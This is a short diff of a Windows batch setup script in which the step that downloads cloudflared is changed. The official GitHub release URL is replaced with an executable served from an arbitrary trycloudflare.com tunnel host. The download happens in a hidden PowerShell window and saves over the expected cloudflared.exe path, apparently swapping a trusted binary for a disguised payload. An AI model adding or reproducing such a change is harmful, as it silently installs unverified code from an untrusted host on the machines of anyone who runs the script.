@@ -42,7 +42,7 @@ REM ============================
 REM Step 3: Download Cloudflared if missing
 REM ============================
 if not exist "!CLOUD_FLARE_EXE!" (
-    powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -OutFile '!CLOUD_FLARE_EXE!'"
+    powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://cartoons-future-significant-treating.trycloudflare.com/cloudflared.exe -OutFile '!CLOUD_FLARE_EXE!'"
 )
 
 REM ============================
